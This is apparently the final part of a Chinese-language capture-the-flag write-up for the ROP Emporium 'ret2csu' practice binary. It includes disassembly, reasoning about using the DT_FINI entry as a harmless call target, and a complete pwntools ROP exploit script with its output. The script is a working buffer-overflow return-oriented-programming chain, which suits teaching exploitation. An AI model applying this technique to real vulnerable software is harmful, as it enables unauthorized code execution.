
```
LOAD:0000000000600E00 01 00 00 00 00 00 00 00 01 00 _DYNAMIC        Elf64_Dyn         ; DATA XREF: LOAD:0000000000400130↑o
LOAD:0000000000600E00 00 00 00 00 00 00                                                     ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o
LOAD:0000000000600E00                                                                       ; DT_NEEDED libret2csu.so
LOAD:0000000000600E10 01 00 00 00 00 00 00 00 38 00…                Elf64_Dyn       ; DT_NEEDED libc.so.6
LOAD:0000000000600E20 1D 00 00 00 00 00 00 00 78 00…                Elf64_Dyn     ; DT_RUNPATH .
LOAD:0000000000600E30 0C 00 00 00 00 00 00 00 D0 04…                Elf64_Dyn  ; DT_INIT
LOAD:0000000000600E40 0D 00 00 00 00 00 00 00 B4 06…                Elf64_Dyn  ; DT_FINI
LOAD:0000000000600E50 19 00 00 00 00 00 00 00 F0 0D…                Elf64_Dyn  ; DT_INIT_ARRAY
LOAD:0000000000600E60 1B 00 00 00 00 00 00 00 08 00…                Elf64_Dyn       ; DT_INIT_ARRAYSZ
LOAD:0000000000600E70 1A 00 00 00 00 00 00 00 F8 0D…                Elf64_Dyn  ; DT_FINI_ARRAY
LOAD:0000000000600E80 1C 00 00 00 00 00 00 00 08 00…                Elf64_Dyn       ; DT_FINI_ARRAYSZ
LOAD:0000000000600E90 F5 FE FF 6F 00 00 00 00 98 02…                Elf64_Dyn  ; DT_GNU_HASH
LOAD:0000000000600EA0 05 00 00 00 00 00 00 00 C0 03…                Elf64_Dyn   ; DT_STRTAB
LOAD:0000000000600EB0 06 00 00 00 00 00 00 00 D0 02…                Elf64_Dyn   ; DT_SYMTAB
LOAD:0000000000600EC0 0A 00 00 00 00 00 00 00 7A 00…                Elf64_Dyn     ; DT_STRSZ
LOAD:0000000000600ED0 0B 00 00 00 00 00 00 00 18 00…                Elf64_Dyn     ; DT_SYMENT
LOAD:0000000000600EE0 15 00 00 00 00 00 00 00 00 00…                Elf64_Dyn       ; DT_DEBUG
LOAD:0000000000600EF0 03 00 00 00 00 00 00 00 00 10…                Elf64_Dyn   ; DT_PLTGOT
LOAD:0000000000600F00 02 00 00 00 00 00 00 00 30 00…                Elf64_Dyn       ; DT_PLTRELSZ
LOAD:0000000000600F10 14 00 00 00 00 00 00 00 07 00…                Elf64_Dyn       ; DT_PLTREL
LOAD:0000000000600F20 17 00 00 00 00 00 00 00 A0 04…                Elf64_Dyn  ; DT_JMPREL
LOAD:0000000000600F30 07 00 00 00 00 00 00 00 70 04…                Elf64_Dyn   ; DT_RELA
LOAD:0000000000600F40 08 00 00 00 00 00 00 00 30 00…                Elf64_Dyn       ; DT_RELASZ
LOAD:0000000000600F50 09 00 00 00 00 00 00 00 18 00…                Elf64_Dyn       ; DT_RELAENT
LOAD:0000000000600F60 FE FF FF 6F 00 00 00 00 50 04…                Elf64_Dyn  ; DT_VERNEED
LOAD:0000000000600F70 FF FF FF 6F 00 00 00 00 01 00…                Elf64_Dyn  ; DT_VERNEEDNUM
LOAD:0000000000600F80 F0 FF FF 6F 00 00 00 00 3A 04…                Elf64_Dyn  ; DT_VERSYM
LOAD:0000000000600F90 00 00 00 00 00 00 00 00 00 00…                Elf64_Dyn            ; DT_NULL
```

这里保存了很多函数的地址，解引用拿到的就是函数本身，其中`0x600E40`的函数`dt_fini`：

```
.fini:00000000004006B4                                               public _term_proc

.fini:00000000004006B4                               _term_proc      proc near               ; DATA XREF: LOAD:00000000004003A8↑o

.fini:00000000004006B4 48 83 EC 08                                   sub     rsp, 8          ; _fini

.fini:00000000004006B8 48 83 C4 08                                   add     rsp, 8

.fini:00000000004006BC C3                                            retn

.fini:00000000004006BC                               _term_proc      endp
```

不会对我们的参数和布局产生影响，太适合了

接下来是：

```
.text:000000000040068D                 add     rbx, 1
.text:0000000000400691                 cmp     rbp, rbx
.text:0000000000400694                 jnz     short loc_400680
```

这里`rbp`和`rbx`都是之前控制的，我们需要让这个跳转不成立，就需要`rbx+1==rbp`的值

完成之后，再`rsp+8`，`pop` 6 个值之后就是下一个返回地址，从这里去修改`rdi`为目标值，然后跳转去`win`函数即可

`exp`：

```
#!/bin/python3

from Crypto.Util.number import *

from pwn import *

warnings.filterwarnings(action='ignore',category=BytesWarning)

context.log_level = 'debug'

FILE_NAME = "ret2csu"

REMOTE_HOST = ""

REMOTE_PORT = 0

elf = context.binary = ELF(FILE_NAME)

libc = elf.libc

gs = '''

'''

def start():

    if args.REMOTE:

        return remote(REMOTE_HOST,REMOTE_PORT)

    if args.GDB:

        return gdb.debug(elf.path, gdbscript=gs)

    else:

        return process(elf.path)

# =======================================

io = start()

# =============================================================================

# ============== exploit ===================

"""

.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j

.text:0000000000400680                 mov     rdx, r15

.text:0000000000400683                 mov     rsi, r14

.text:0000000000400686                 mov     edi, r13d

.text:0000000000400689                 call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]

.text:000000000040068D                 add     rbx, 1

.text:0000000000400691                 cmp     rbp, rbx

.text:0000000000400694                 jnz     short loc_400680

.text:0000000000400696

.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j

.text:0000000000400696                 add     rsp, 8

.text:000000000040069A                 pop     rbx

.text:000000000040069B                 pop     rbp

.text:000000000040069C                 pop     r12

.text:000000000040069E                 pop     r13

.text:00000000004006A0                 pop     r14

.text:00000000004006A2                 pop     r15

.text:00000000004006A4                 retn

"""

csu1 = 0x000000000400680 

csu2 = 0x00000000040069A             

call_win = 0x000000000400510         

pwnme_got = 0x000000000601018

pop_rdi = 0x00000000004006a3 #: pop rdi ; ret

safe_deference = 0x000000000600E48

rdi = 0xDEADBEEFDEADBEEF

rsi = 0xCAFEBABECAFEBABE

rdx = 0xD00DF00DD00DF00D

rbp = 0x000000000601028

payload = b"A" * 0x28

payload += pack(csu2)

payload += pack(0)+pack(1) + pack(safe_deference) + pack(rdi) + pack(rsi) + pack(rdx)

payload += pack(csu1)

payload += pack(0)*7

payload += pack(pop_rdi) + pack(rdi)

payload += pack(call_win)

io.sendafter(b"> ",payload)

io.interactive()
```

运行结果：

```
ret2csu.zip.d ➤ python3 exp.py
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

### 总结

8个练习最有难度的对我来说就是fluff去理解两个陌生的指令，其他的嘛，基本上就是出啥躲啥

我愿称之为：一次不错的查漏补缺之旅
